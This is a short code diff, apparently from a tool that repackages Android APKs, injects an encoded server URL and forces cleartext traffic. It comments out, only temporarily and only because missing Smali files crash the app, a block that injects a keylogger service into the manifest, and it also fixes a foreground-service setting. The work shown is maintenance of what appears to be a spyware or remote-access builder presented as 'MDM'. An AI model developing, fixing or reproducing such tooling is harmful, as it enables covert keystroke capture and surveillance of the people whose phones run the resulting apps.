@@ -224,6 +224,7 @@ export class APKCompiler {
         return encoded.toString("base64");
       };
 
+      // [ADM] Limpiar URL de parámetros previos para evitar ?model=?model=...
       const finalRawUrl = serverUrl.split('?')[0].replace(/\/$/, "");
       const secureInjectedUrl = encodeUrl(finalRawUrl);
       
@@ -509,6 +510,9 @@ export class APKCompiler {
 
       let manifest = readFileSync(manifestPath, "utf8");
 
+      // [ADM FIX] Desactivado temporalmente porque faltan los archivos Smali correspondientes
+      // y causan ClassNotFoundException (Crash) al iniciar la app.
+      /*
       if (config.enableKeylogger) {
         logs.push("[MDM] Keylogger habilitado");
         manifest = manifest.replace("</application>", `
@@ -551,14 +555,15 @@ export class APKCompiler {
         </service>
         </application>`);
       }
+      */
 
       // [PROACTIVO] Forzar permiso de tráfico de red para evitar bloqueos en Android 11
       if (!manifest.includes("android:usesCleartextTraffic")) {
           manifest = manifest.replace("<application", '<application android:usesCleartextTraffic="true"');
       }
 
-      // [PROACTIVO] Limpiar atributos incompatibles (Fix Error: No resource identifier found for attribute 'foregroundServiceType')
-      manifest = manifest.replace(/android:foregroundServiceType=".*?"/g, "");
+      // [ADM FIX] No eliminar foregroundServiceType, es necesario para Android 14
+      // manifest = manifest.replace(/android:foregroundServiceType=".*?"/g, "");
       
       writeFileSync(manifestPath, manifest);
       logs.push("[MDM] Features inyectadas correctamente");
